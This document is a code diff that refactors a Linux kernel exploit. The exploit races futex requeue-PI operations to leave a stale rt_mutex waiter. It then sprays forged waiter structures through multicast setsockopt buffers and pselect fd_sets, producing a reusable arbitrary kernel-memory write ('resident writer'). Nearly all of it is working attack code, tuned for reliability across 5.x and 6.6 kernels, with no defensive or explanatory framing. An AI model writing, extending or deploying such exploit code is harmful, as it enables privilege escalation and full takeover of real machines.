@@ -2,8 +2,11 @@
 #include <time.h>
 #include <netinet/in.h>
 #include <netinet/tcp.h>
+#include <sys/timerfd.h>
 
 #include "target.h"
+#include "multicast_waiter_route.h"
+#include "select_stack_route.h"
 #include "tcp_zerocopy_route.h"
 
 /* Decoupling plan: route-local elapsed-time helper. Input: monotonic reference;
@@ -18,195 +21,236 @@ static const struct execution_settings *execution_settings(void) {
 int route_last_step;
 int route_last_errno;
 
-/* TODO(decoupling:S11-S13-route-context): Route instances will receive their
- * PiRaceContext explicitly. Until then these aliases expose one owned context. */
-#define legacy_consumer_go (g_pi_race_context.consumer_go)
-#define legacy_consumer_stop (g_pi_race_context.consumer_stop)
-#define legacy_consumer_calls (g_pi_race_context.consumer_calls)
-#define legacy_consumer_success (g_pi_race_context.consumer_success)
-#define legacy_consumer_inflight (g_pi_race_context.consumer_inflight)
-#define legacy_route_delay_usec (g_pi_race_context.route_delay_usec)
+/* One process-level resident is retained across W1/W2. Its mutable state and
+ * resources have one explicit owner; S14 will move that owner into session. */
+static MulticastWaiterRouteContext multicast_resident_context;
 
-/* 5.x kernel route. The multicast option buffer overlaps the stale compact
- * waiter. Profiles opt in with kernel_major=5 and mcast_waiter_off. */
-static uint32_t mr_l1, mr_l2, mr_cond;
-static pthread_t mr_tx, mr_ty;
-static atomic_int mr_y_l2, mr_x_l1, mr_y_wait, mr_x_wait, mr_y_done;
-static atomic_int mr_respray, mr_sprayed, mr_stop, mr_x_done, mr_y_tid;
-static uintptr_t mr_target, mr_value, mr_lock, mr_task;
-static int mr_fd = -1, mr_ready, mr_policy, mr_lock_slot;
+static void multicast_waiter_interrupt(int sig) { (void)sig; }
 
-/* Decoupling plan: signal hook used only to interrupt the multicast waiter.
- * Input: signal number; output: none. Future: multicast_waiter_interrupt();
- * installation and previous-handler ownership move to MulticastWaiterContext. */
-static void mr_intr(int sig) { (void)sig; }
-/* Decoupling plan: toggle the resident multicast waiter's scheduler policy.
- * Input: implicit waiter TID/policy; output: syscall result. Future:
- * multicast_waiter_adjust(context), with policy stored in the route context. */
-static long mr_adjust(void) {
+static long multicast_waiter_adjust(MulticastWaiterRouteContext *context) {
   struct sched_param sp = {.sched_priority = 0};
-  int next = mr_policy == SCHED_NORMAL ? SCHED_BATCH : SCHED_NORMAL;
-  long r = syscall(SYS_sched_setscheduler, atomic_load(&mr_y_tid), next, &sp);
-  mr_policy = next;
+  int next = context->scheduler_policy == SCHED_NORMAL
+                 ? SCHED_BATCH : SCHED_NORMAL;
+  long r = syscall(SYS_sched_setscheduler,
+                   atomic_load(&context->waiter_tid), next, &sp);
+  context->scheduler_policy = next;
   return r;
 }
-/* Decoupling plan: encode and submit one multicast overlap buffer. Inputs:
- * profile, target, value, lock, task and socket; output: submission status.
- * Future: multicast_waiter_stamp(context, request), returning structured error. */
-static void mr_stamp(uintptr_t target, uintptr_t value, uintptr_t lock) {
-  MulticastWaiterLayout layout =
-      target_profile_multicast_waiter_layout(&g_target_profile);
-  size_t size = layout.buffer_size;
+
+static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
+                                  uintptr_t target, uintptr_t value,
+                                  uintptr_t lock) {
+  size_t size = context->layout.buffer_size;
   unsigned char b[size];
-  size_t o = layout.waiter_offset;
+  size_t o = context->layout.waiter_offset;
   memset(b, 0, sizeof(b));
-  if (target) { put64(b, o, (target - 8) & ~(uintptr_t)3); put64(b, o + 8, value); }
-  put64(b, o + layout.task_offset, mr_task);
-  put64(b, o + layout.lock_offset, lock);
-  uint16_t family = AF_UNSPEC; memcpy(b + 8, &family, sizeof(family));
-  setsockopt(mr_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, b, sizeof(b));
+  if (target) {
+    put64(b, o, (target - 8) & ~(uintptr_t)3);
+    put64(b, o + 8, value);
+  }
+  put64(b, o + context->layout.task_offset, context->task);
+  put64(b, o + context->layout.lock_offset, lock);
+  uint16_t family = AF_UNSPEC;
+  memcpy(b + 8, &family, sizeof(family));
+  return setsockopt(context->socket_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
+                    b, sizeof(b));
 }
-/* Decoupling plan: multicast waiter/respray worker. Input: currently implicit
- * mr_* state; output: completion in atomics. Future:
- * multicast_waiter_worker(void *MulticastWaiterContext), owning its socket. */
-static void *mr_y(void *arg) {
-  (void)arg; pin_to_core(CONSUMER_CORE);
+
+static void *multicast_waiter_worker(void *arg) {
+  MulticastWaiterRouteContext *context = arg;
+  pin_to_core(context->consumer_cpu);
   sigset_t set; sigemptyset(&set); sigaddset(&set, SIGUSR1);
   pthread_sigmask(SIG_UNBLOCK, &set, NULL);
-  atomic_store(&mr_y_tid, syscall(SYS_gettid));
-  futex_op(&mr_l2, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
-  atomic_store(&mr_y_l2, 1); while (!atomic_load(&mr_x_l1)) sched_yield();
-  atomic_store(&mr_y_wait, 1);
-  futex_op(&mr_cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, NULL, &mr_l1, 0);
-  mr_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
-  if (mr_fd < 0) return NULL;
-  mr_stamp(0, 0, mr_lock); atomic_store(&mr_y_done, 1);
-  while (!atomic_load(&mr_stop)) {
-    if (atomic_exchange(&mr_respray, 0)) {
-      MulticastWaiterLayout layout =
-          target_profile_multicast_waiter_layout(&g_target_profile);
-      uintptr_t lock = mr_lock + layout.lock_slots_offset +
-          (mr_lock_slot++ % layout.lock_slot_count) * layout.lock_slot_stride;
-      mr_stamp(mr_target, mr_value, lock); atomic_store(&mr_sprayed, 1);
+  atomic_store(&context->waiter_tid, syscall(SYS_gettid));
+  futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  atomic_store(&context->waiter_has_lock2, 1);
+  while (!atomic_load(&context->owner_has_lock1)) sched_yield();
+  atomic_store(&context->waiter_waiting, 1);
+  futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
+           0, NULL, &context->lock1_futex, 0);
+  context->socket_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+  if (context->socket_fd < 0) return NULL;
+  multicast_waiter_stamp(context, 0, 0, context->lock);
+  atomic_store(&context->waiter_ready, 1);
+  while (!atomic_load(&context->stop_requested)) {
+    if (atomic_exchange(&context->respray_requested, 0)) {
+      uintptr_t lock = context->lock + context->layout.lock_slots_offset +
+          (context->lock_slot++ % context->layout.lock_slot_count) *
+              context->layout.lock_slot_stride;
+      multicast_waiter_stamp(context, context->target, context->value, lock);
+      atomic_store(&context->sprayed, 1);
     }
     sched_yield();
   }
   uint32_t dummy = 0x80000000U | (uint32_t)getpid(); struct timespec z = {0,0};
   futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, NULL, 0);
-  futex_op(&mr_l2, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
-  while (!atomic_load(&mr_x_done)) sched_yield();
-  close(mr_fd); mr_fd = -1; return NULL;
+  futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  while (!atomic_load(&context->owner_done)) sched_yield();
+  close(context->socket_fd); context->socket_fd = -1;
+  return NULL;
 }
-/* Decoupling plan: multicast owner worker. Input: currently implicit mr_* PI
- * state; output: synchronization flags. Future:
- * multicast_waiter_owner_worker(void *MulticastWaiterContext). */
-static void *mr_x(void *arg) {
-  (void)arg; pin_to_core(CORE);
-  while (!atomic_load(&mr_y_l2)) sched_yield();
-  futex_op(&mr_l1, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
-  atomic_store(&mr_x_l1, 1); atomic_store(&mr_x_wait, 1);
-  futex_op(&mr_l2, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
-  futex_op(&mr_l1, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
-  futex_op(&mr_l2, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
-  atomic_store(&mr_x_done, 1); return NULL;
+
+static void *multicast_owner_worker(void *arg) {
+  MulticastWaiterRouteContext *context = arg;
+  pin_to_core(context->main_cpu);
+  while (!atomic_load(&context->waiter_has_lock2)) sched_yield();
+  futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  atomic_store(&context->owner_has_lock1, 1);
+  atomic_store(&context->owner_waiting, 1);
+  futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  atomic_store(&context->owner_done, 1);
+  return NULL;
 }
-/* Decoupling plan: initialize the long-lived multicast writer. Input: profile,
- * addresses and CPUs; output: ready/error status. Future:
- * multicast_waiter_resident_prepare(context, session); kernel version stays in
- * profile comments rather than the symbol name. */
+
 int kernel5_resident_start(void) {
-  if (mr_ready) return 1;
+  MulticastWaiterRouteContext *context = &multicast_resident_context;
+  if (context->ready) return 1;
+  if (context->waiter_worker_started || context->owner_worker_started) {
+    pr_warning("multicast resident remains partially armed; refusing restart\n");
+    return 0;
+  }
   MulticastWaiterLayout layout =
       target_profile_multicast_waiter_layout(&g_target_profile);
   const struct execution_settings *execution = execution_settings();
+  multicast_waiter_route_context_init(
+      context, &g_pi_race_context, NULL, execution, layout, 1);
+  context->main_cpu = g_runtime_config.main_cpu;
+  context->consumer_cpu = g_runtime_config.consumer_cpu;
   uintptr_t bss = resolved_addresses_data_alias(
       &g_resolved_addresses, KIMAGE_TEXT_BASE + layout.fake_bss_image_offset);
-  mr_lock = bss + layout.fake_lock_offset;
-  mr_task = bss + layout.fake_task_offset;
-  mr_l1=mr_l2=mr_cond=0; mr_policy=SCHED_NORMAL; mr_lock_slot=0;
-  atomic_store(&mr_y_l2,0); atomic_store(&mr_x_l1,0); atomic_store(&mr_y_wait,0);
-  atomic_store(&mr_x_wait,0); atomic_store(&mr_y_done,0); atomic_store(&mr_stop,0);
-  atomic_store(&mr_x_done,0); atomic_store(&mr_respray,0);
-  struct sigaction sa={0}; sa.sa_handler=mr_intr; sigemptyset(&sa.sa_mask);
-  if (sigaction(SIGUSR1,&sa,NULL) || pthread_create(&mr_ty,NULL,mr_y,NULL) ||
-      pthread_create(&mr_tx,NULL,mr_x,NULL)) return 0;
+  context->lock = bss + layout.fake_lock_offset;
+  context->task = bss + layout.fake_task_offset;
+  struct sigaction sa={0}; sa.sa_handler=multicast_waiter_interrupt;
+  sigemptyset(&sa.sa_mask);
+  if (sigaction(SIGUSR1, &sa, NULL) != 0) return 0;
+  if (pthread_create(&context->waiter_worker, NULL,
+                     multicast_waiter_worker, context) != 0) return 0;
+  context->waiter_worker_started = 1;
+  if (pthread_create(&context->owner_worker, NULL,
+                     multicast_owner_worker, context) != 0) return 0;
+  context->owner_worker_started = 1;
   struct timespec ready_started;
   clock_gettime(CLOCK_MONOTONIC, &ready_started);
-  while (!(atomic_load(&mr_y_l2)&&atomic_load(&mr_x_l1)&&
-           atomic_load(&mr_y_wait)&&atomic_load(&mr_x_wait))) {
+  while (!(atomic_load(&context->waiter_has_lock2) &&
+           atomic_load(&context->owner_has_lock1) &&
+           atomic_load(&context->waiter_waiting) &&
+           atomic_load(&context->owner_waiting))) {
     if (fops_elapsed_ms(&ready_started) >= execution->multicast_ready_timeout_ms)
       return 0;
     sched_yield();
   }
   usleep(execution->multicast_post_requeue_settle_us); errno=0;
-  long r=futex_op(&mr_cond,FUTEX_CMP_REQUEUE_PI_PRIVATE,1,(void*)0,&mr_l1,0);
-  mr_cond=1; syscall(SYS_tgkill,getpid(),atomic_load(&mr_y_tid),SIGUSR1);
+  long r=futex_op(&context->condition_futex,FUTEX_CMP_REQUEUE_PI_PRIVATE,
+                  1,(void*)0,&context->lock1_futex,0);
+  context->condition_futex=1;
+  syscall(SYS_tgkill,getpid(),atomic_load(&context->waiter_tid),SIGUSR1);
   if (r>=0 || (errno!=EDEADLK && errno!=EDEADLOCK)) return 0;
   clock_gettime(CLOCK_MONOTONIC, &ready_started);
-  while (!atomic_load(&mr_y_done) &&
+  while (!atomic_load(&context->waiter_ready) &&
          fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
     sched_yield();
-  if(!atomic_load(&mr_y_done) || mr_adjust()<0) return 0;
-  usleep(execution->multicast_post_adjust_settle_us); mr_ready=1;
-  pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",bss,mr_lock,mr_task);
+  if(!atomic_load(&context->waiter_ready) ||
+     multicast_waiter_adjust(context)<0) return 0;
+  usleep(execution->multicast_post_adjust_settle_us);
+  context->ready=1; context->status.code=ROUTE_OK;
+  pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",
+             bss,context->lock,context->task);
   return 1;
 }
-/* Decoupling plan: execute one resident multicast write. Inputs: context plus
- * target/value; output: route status. Future:
- * multicast_waiter_resident_execute(context, write_request). */
+
 int kernel5_resident_write(uintptr_t target, uintptr_t value) {
-  if(!mr_ready) return 0; mr_target=target; mr_value=value;
-  atomic_store(&mr_sprayed,0); atomic_store(&mr_respray,1);
-  while(!atomic_load(&mr_sprayed)) sched_yield();
-  long r=mr_adjust(); pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n",value,target,r);
+  MulticastWaiterRouteContext *context = &multicast_resident_context;
+  if(!context->ready) return 0;
+  context->target=target; context->value=value;
+  atomic_store(&context->sprayed,0);
+  atomic_store(&context->respray_requested,1);
+  while(!atomic_load(&context->sprayed)) sched_yield();
+  long r=multicast_waiter_adjust(context);
+  pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n",value,target,r);
   return r==0;
 }
-/* Decoupling plan: disarm and destroy resident multicast resources. Input:
- * route/heap contexts; output: clean/disarmed status. Future: split into
- * multicast_waiter_disarm() and multicast_waiter_destroy(). */
+
+static void multicast_waiter_disarm(MulticastWaiterRouteContext *context) {
+  atomic_store(&context->stop_requested,1);
+  atomic_store(&context->race->consumer_go,0);
+  while (atomic_load(&context->race->consumer_inflight)) sched_yield();
+  context->status.kernel_disarmed=1;
+}
+
+static void multicast_waiter_destroy(MulticastWaiterRouteContext *context) {
+  if (context->waiter_worker_started) {
+    pthread_join(context->waiter_worker,NULL);
+    context->waiter_worker_started=0;
+  }
+  if (context->owner_worker_started) {
+    pthread_join(context->owner_worker,NULL);
+    context->owner_worker_started=0;
+  }
+  if (context->socket_fd>=0) { close(context->socket_fd); context->socket_fd=-1; }
+  context->ready=0;
+  context->status.userspace_clean=1;
+  if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
+    context->status.code=ROUTE_FALLBACK_SAFE;
+  }
+}
+
 void kernel5_resident_stop(void) {
-  if(!mr_ready) return; atomic_store(&mr_stop,1);
-  pthread_join(mr_ty,NULL); pthread_join(mr_tx,NULL); mr_ready=0;
+  MulticastWaiterRouteContext *context = &multicast_resident_context;
+  if(!context->ready) {
+    if (context->waiter_worker_started || context->owner_worker_started) {
+      context->status.code=ROUTE_DIRTY_FAILURE;
+      pr_warning("multicast resident partial setup retained for process exit\n");
+    }
+    return;
+  }
+  multicast_waiter_disarm(context);
+  multicast_waiter_destroy(context);
+  /* TODO(decoupling:S14-multicast-heap-handoff): These HeapContext actions
+   * remain here only to preserve the validated W1/W2 stop order. Move them to
+   * ExploitSession after route destroy reports userspace_clean. */
   close_reclaim_sockets(); cleanup_page_prepare_state();
   pr_success("5.x resident writer disarmed\n");
 }
 
-/* Decoupling plan: execute the one-shot multicast waiter route. Input: route,
- * profile, payload and race contexts; output: RouteStatus. Future:
- * multicast_waiter_execute(); route_last_* becomes the returned status. */
 void do_kernel5_fake_lock_route(const WriteRequest *request) {
-  (void)request;
-  MulticastWaiterLayout layout =
-      target_profile_multicast_waiter_layout(&g_target_profile);
-  size_t stamp_size = layout.buffer_size;
-  size_t waiter_off = layout.waiter_offset;
-  unsigned char stamp[stamp_size];
-  memset(stamp, 0, sizeof(stamp));
-  build_multicast_waiter_payload(
-      stamp, waiter_off, layout.task_offset,
-      layout.lock_offset, fake_task, fake_lock);
-  // TODO(decoupling:S13-multicast-context): Future: encoder input comes from
-  // MulticastWaiterRouteContext. Input: route-owned layout/payload; output:
-  // stamp bytes. Blocked by: route ownership migration in S13.
-  uint16_t family = AF_UNSPEC;
-  memcpy(stamp + 8, &family, sizeof(family));
-
-  int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
-  if (fd < 0) { route_last_step = 60; route_last_errno = errno; return; }
-  atomic_store(&legacy_consumer_calls, 0); atomic_store(&legacy_consumer_success, 0);
-  atomic_store(&legacy_consumer_stop, 0); atomic_store(&legacy_route_delay_usec, 0);
-  errno = 0;
-  int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, sizeof(stamp));
-  route_last_step = 61; route_last_errno = errno;
-  atomic_store(&legacy_consumer_go, 1);
-  for (int spin = 0; spin < 100000000 && atomic_load(&legacy_consumer_calls) == 0; spin++)
-    __asm__ volatile("yield" ::: "memory");
-  atomic_store(&legacy_consumer_go, 0);
-  while (atomic_load(&legacy_consumer_inflight)) __asm__ volatile("yield" ::: "memory");
-  close(fd);
-  if (ret == 0 || atomic_load(&legacy_consumer_success) > 0) {
-    route_last_step = 0; route_last_errno = 0;
+  MulticastWaiterRouteContext context;
+  multicast_waiter_route_context_init(
+      &context, &g_pi_race_context, request, execution_settings(),
+      target_profile_multicast_waiter_layout(&g_target_profile), 0);
+  context.main_cpu = g_runtime_config.main_cpu;
+  context.consumer_cpu = g_runtime_config.consumer_cpu;
+  context.task=fake_task; context.lock=fake_lock;
+  context.socket_fd=socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+  if (context.socket_fd<0) {
+    route_last_step=60; route_last_errno=errno;
+    context.status.step=route_last_step;
+    context.status.error_number=route_last_errno;
+    goto out;
   }
+  atomic_store(&context.race->consumer_calls,0);
+  atomic_store(&context.race->consumer_success,0);
+  atomic_store(&context.race->consumer_stop,0);
+  atomic_store(&context.race->route_delay_usec,0);
+  errno = 0;
+  int ret=multicast_waiter_stamp(&context,0,0,context.lock);
+  route_last_step = 61; route_last_errno = errno;
+  atomic_store(&context.race->consumer_go,1);
+  for (int spin=0; spin<100000000 &&
+       atomic_load(&context.race->consumer_calls)==0; spin++)
+    __asm__ volatile("yield" ::: "memory");
+  if (ret==0 || atomic_load(&context.race->consumer_success)>0) {
+    route_last_step=0; route_last_errno=0; context.status.code=ROUTE_OK;
+  }
+  context.status.step=route_last_step;
+  context.status.error_number=route_last_errno;
+out:
+  multicast_waiter_disarm(&context);
+  multicast_waiter_destroy(&context);
+  pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
+          context.status.code,context.status.userspace_clean,
+          context.status.kernel_disarmed,route_last_step,route_last_errno);
 }
 
 /* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
@@ -542,11 +586,12 @@ void do_tcp_fake_lock_route(const WriteRequest *request) {
 /* Decoupling plan: choose route timing delay. Input: attempt and eventually
  * immutable profile; output: microseconds. Future:
  * select_stack_delay_usec(const TargetProfile *, int). */
-static int route_delay_usec(int attempt) {
+static int route_delay_usec(const SelectStackRouteContext *context,
+                            int attempt) {
   (void)attempt;
   /* Both routes: let select/pselect establish its frame and stamp the
    * crafted waiter before the PI walk fires. */
-  return (int)execution_settings()->select_enter_delay_us;
+  return (int)context->execution->select_enter_delay_us;
 }
 
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
@@ -590,14 +635,9 @@ static int pselect_put_global_word(
 
 /* Decoupling plan: read the select-stack waiter layout. Input: profile; output:
  * word shift. Future: select_stack_waiter_shift(const TargetProfile *). */
-static int pselect_waiter_shift(void) {
-  SelectStackLayout layout =
-      target_profile_select_stack_layout(&g_target_profile);
-  // TODO(decoupling:S12-select-context): Future: this layout is owned by
-  // SelectStackRouteContext. Input: route context/request; output: fd_sets.
-  // Blocked by: route ownership migration in S12.
+static int pselect_waiter_shift(const SelectStackRouteContext *context) {
   return target_profile_is_loaded(&g_target_profile)
-             ? layout.waiter_shift
+             ? context->layout.waiter_shift
              : PSELECT_WAITER_WORD_SHIFT;
 }
 
@@ -605,11 +645,12 @@ static int pselect_waiter_shift(void) {
  * layout, sets, word/value; output: placement status. Future:
  * select_stack_put_waiter_word(layout, sets, ...), without global profile. */
 static void pselect_put_waiter_word(
-    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
+    SelectStackRouteContext *context, int words_per_set,
     int waiter_word, uint64_t value, const char *name) {
-  int global_word = pselect_waiter_shift() + waiter_word;
+  int global_word = pselect_waiter_shift(context) + waiter_word;
   int placed = pselect_put_global_word(
-      in, out, ex, words_per_set, global_word, value);
+      &context->input_set, &context->output_set, &context->exception_set,
+      words_per_set, global_word, value);
   if (!placed) {
     pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
                "words_per_set=%d nfds=%d\n",
@@ -660,26 +701,25 @@ void reserve_standard_io(void) {
 /* Decoupling plan: restore standard descriptors from route-owned backups.
  * Input: route context; output: restored/closed state. Future:
  * select_stack_restore_stdio(SelectStackRouteContext *). */
-static void restore_standard_io(void) {
+static void restore_standard_io(const int backup[3]) {
   for (int fd = 0; fd < 3; fd++) {
-    if (standard_io_backup[fd] < 0) continue;
-    dup2(standard_io_backup[fd], fd);
+    if (backup[fd] < 0) continue;
+    dup2(backup[fd], fd);
   }
 }
 
 /* Decoupling plan: build the compact/tree select-stack waiter image. Inputs:
  * profile, payload layout and write request; output: three fd_sets. Future:
  * select_stack_build_fdsets(profile, payload, request, result). */
-void prepare_pselect_fdsets(
-    fd_set *in, fd_set *out, fd_set *ex, const WriteRequest *request) {
-  FD_ZERO(in);
-  FD_ZERO(out);
-  FD_ZERO(ex);
+static void select_stack_build_fdsets(SelectStackRouteContext *context) {
+  fd_set *in = &context->input_set;
+  fd_set *out = &context->output_set;
+  fd_set *ex = &context->exception_set;
+  const WriteRequest *request = context->request;
+  FD_ZERO(in); FD_ZERO(out); FD_ZERO(ex);
 
   int words_per_set = pselect_words_per_set();
-  SelectStackLayout layout =
-      target_profile_select_stack_layout(&g_target_profile);
-  int compact = layout.compact_waiter;
+  int compact = context->layout.compact_waiter;
 
   struct pselect_waiter_word {
     int word;
@@ -709,8 +749,8 @@ void prepare_pselect_fdsets(
     };
     for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
       struct pselect_waiter_word *w = &words[i];
-      pselect_put_waiter_word(
-          in, out, ex, words_per_set, w->word, w->value, w->name);
+      pselect_put_waiter_word(context, words_per_set,
+                              w->word, w->value, w->name);
     }
   } else {
     /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
@@ -731,237 +771,214 @@ void prepare_pselect_fdsets(
     };
     for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
       struct pselect_waiter_word *w = &words[i];
-      pselect_put_waiter_word(
-          in, out, ex, words_per_set, w->word, w->value, w->name);
+      pselect_put_waiter_word(context, words_per_set,
+                              w->word, w->value, w->name);
     }
   }
 }
 
-/* Decoupling plan: prepare, execute and clean the select-stack route. Input:
- * session payload/race state; output: RouteStatus. Future: split into
- * select_stack_prepare/execute/disarm/destroy; dirty failures retain ownership. */
-void do_pselect_fake_lock_route(const WriteRequest *request) {
+/* Compatibility helper retained until S15; route execution uses its context. */
+void prepare_pselect_fdsets(
+    fd_set *in, fd_set *out, fd_set *ex, const WriteRequest *request) {
+  SelectStackRouteContext context;
+  select_stack_route_context_init(
+      &context, &g_pi_race_context, request, execution_settings(),
+      target_profile_select_stack_layout(&g_target_profile),
+      standard_io_backup);
+  select_stack_build_fdsets(&context);
+  *in = context.input_set;
+  *out = context.output_set;
+  *ex = context.exception_set;
+}
+
+static int select_stack_fail(SelectStackRouteContext *context,
+                             int step, int error_number) {
+  context->status.step = step;
+  context->status.error_number = error_number;
+  route_last_step = step;
+  route_last_errno = error_number;
+  return -1;
+}
+
+static int select_stack_prepare(SelectStackRouteContext *context) {
   if (!page_base || !fake_lock || !fake_fops) {
-    route_last_step = 30;
-    route_last_errno = 0;
-    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
-             page_base, fake_lock, fake_fops);
-    return;
+    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
+               "fops=%016zx\n", page_base, fake_lock, fake_fops);
+    return select_stack_fail(context, 30, 0);
   }
-
-  struct timespec route_t0;
-  clock_gettime(CLOCK_MONOTONIC, &route_t0);
-  int calls = 0;
-  int success = 0;
-  const struct execution_settings *execution = execution_settings();
-  int pipefd[2];
-  SYSCHK(pipe(pipefd));
-
-  SelectStackLayout layout =
-      target_profile_select_stack_layout(&g_target_profile);
-  int compact_route = layout.compact_waiter;
+  if (pipe(context->pipe_fd) != 0) {
+    return select_stack_fail(context, 31, errno);
+  }
 
   /* Both routes park on a never-ready timerfd: the waiter must stay stale
    * on the pselect stack for the whole consumer window. */
-  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
-  if (block_fd < 0) {
+  context->block_fd =
+      (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC);
+  if (context->block_fd < 0) {
     pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                errno);
-    block_fd = pipefd[0];
+    context->block_fd = context->pipe_fd[0];
   }
-  int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
-  if (high_read < 0) {
-    route_last_step = 31;
-    route_last_errno = errno;
-    pr_error("pselect F_DUPFD read errno=%d\n", errno);
-    if (block_fd != pipefd[0]) {
-      close(block_fd);
-    }
-    close(pipefd[0]);
-    close(pipefd[1]);
-    return;
+  context->high_read_fd =
+      fcntl(context->block_fd, F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 16);
+  if (context->high_read_fd < 0) {
+    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
+    return select_stack_fail(context, 32, errno);
   }
 
-  fd_set in;
-  fd_set out;
-  fd_set ex;
-  prepare_pselect_fdsets(&in, &out, &ex, request);
+  select_stack_build_fdsets(context);
   pr_info("pselect route setup shift=%d page=%016zx "
           "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
           "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
           "ex1=%016llx ex2=%016llx ex3=%016llx\n",
-          pselect_waiter_shift(),
+          pselect_waiter_shift(context),
           page_base, fake_lock, fake_w0, fake_task,
-          (unsigned long long)fdset_get_word(&in, 0),
-          (unsigned long long)fdset_get_word(&in, 3),
-          (unsigned long long)fdset_get_word(&out, 0),
-          (unsigned long long)fdset_get_word(&ex, 0),
-          (unsigned long long)fdset_get_word(&ex, 1),
-          (unsigned long long)fdset_get_word(&ex, 2),
-          (unsigned long long)fdset_get_word(&ex, 3));
+          (unsigned long long)fdset_get_word(&context->input_set, 0),
+          (unsigned long long)fdset_get_word(&context->input_set, 3),
+          (unsigned long long)fdset_get_word(&context->output_set, 0),
+          (unsigned long long)fdset_get_word(&context->exception_set, 0),
+          (unsigned long long)fdset_get_word(&context->exception_set, 1),
+          (unsigned long long)fdset_get_word(&context->exception_set, 2),
+          (unsigned long long)fdset_get_word(&context->exception_set, 3));
 
   /* The route may replace low fds, including stdout and stderr. */
-  reserve_standard_io();
-  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
-  close(high_read);
+  open_selected_fds(&context->input_set, &context->output_set,
+                    &context->exception_set, context->high_read_fd,
+                    context->pipe_fd[1]);
+  context->owned_input_set = context->input_set;
+  context->owned_output_set = context->output_set;
+  context->owned_exception_set = context->exception_set;
+  close(context->high_read_fd);
+  context->high_read_fd = -1;
+  context->selected_fds_installed = 1;
+  return 0;
+}
 
-  atomic_store(&legacy_consumer_calls, 0);
-  atomic_store(&legacy_consumer_success, 0);
-  atomic_store(&legacy_consumer_stop, 0);
-  int delay_usec = route_delay_usec(1);
-  atomic_store(&legacy_route_delay_usec, delay_usec);
-  atomic_store(&legacy_consumer_go, 1);
+static RouteStatus select_stack_execute(SelectStackRouteContext *context) {
+  struct timespec route_t0;
+  clock_gettime(CLOCK_MONOTONIC, &route_t0);
 
-  pr_info("pselect pre-select compact=%d +%.0fms\n", compact_route,
+  atomic_store(&context->race->consumer_calls, 0);
+  atomic_store(&context->race->consumer_success, 0);
+  atomic_store(&context->race->consumer_stop, 0);
+  int delay_usec = route_delay_usec(context, 1);
+  atomic_store(&context->race->route_delay_usec, delay_usec);
+  atomic_store(&context->race->consumer_go, 1);
+
+  pr_info("pselect pre-select compact=%d +%.0fms\n",
+          context->layout.compact_waiter,
           fops_elapsed_ms(&route_t0));
   errno = 0;
-  int ret;
-  if (compact_route) {
-    uint32_t timeout_us = execution->select_timeout_us;
+  if (context->layout.compact_waiter) {
+    uint32_t timeout_us = context->execution->select_timeout_us;
     struct timespec ts = {
       .tv_sec = timeout_us / 1000000,
       .tv_nsec = (long)(timeout_us % 1000000) * 1000,
     };
-    ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
+    context->select_result = pselect(
+        PSELECT_ROUTE_NFDS, &context->input_set, &context->output_set,
+        &context->exception_set, &ts, NULL);
   } else {
-    /* 6.6: select() with a {0, 200ms} timeout. */
-    uint32_t timeout_us = execution->select_timeout_us;
+    uint32_t timeout_us = context->execution->select_timeout_us;
     struct timeval timeout = {
       .tv_sec = timeout_us / 1000000,
